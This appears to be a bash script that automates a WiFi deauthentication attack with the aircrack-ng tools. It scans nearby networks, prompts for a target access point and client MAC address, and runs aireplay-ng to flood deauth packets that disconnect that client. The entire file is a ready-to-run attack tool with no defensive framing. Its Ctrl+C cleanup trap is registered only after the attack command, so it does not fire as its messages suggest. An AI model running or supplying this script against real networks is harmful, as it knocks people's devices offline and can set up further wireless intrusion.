#!/bin/bash

cleanup() {
  echo ""
  echo "[*] Ctrl+C detected. Cleaning up..."
  airmon-ng stop "$mon_interface" 2>/dev/null
  echo "[✓] Monitor mode disabled. Exiting."
  exit
}


if [ "$EUID" -ne 0 ]; then
  echo "[!] Please run this script as root."
  exit 1
fi

./monitor_check.sh

mon_interface=$(iw dev | awk '$1=="Interface"{print $2}' | grep mon | head -n1)

if [ -z "$mon_interface" ]; then
  echo "[!] Monitor interface bulunamadı."
  exit 1
fi

echo "[*] Monitor interface in use: $mon_interface"

echo "[*] Scanning nearby WiFi networks. Press CTRL+C to stop."
airodump-ng "$mon_interface"

read -p "Enter target network's BSSID: " bssid
read -p "Enter target network's channel: " channel
read -p "Enter number of deauth packets (0 = unlimited): " deauth

echo "[*] Scanning clients on target network. Press CTRL+C to stop."
airodump-ng -c "$channel" --bssid "$bssid" "$mon_interface"

read -p "Enter target client MAC manually to attack: " target_mac

echo "[*] Starting deauth attack on $target_mac... Press CTRL+C to stop."
aireplay-ng --deauth "$deauth" -a "$bssid" -c "$target_mac" "$mon_interface"
trap cleanup SIGINT

cleanup
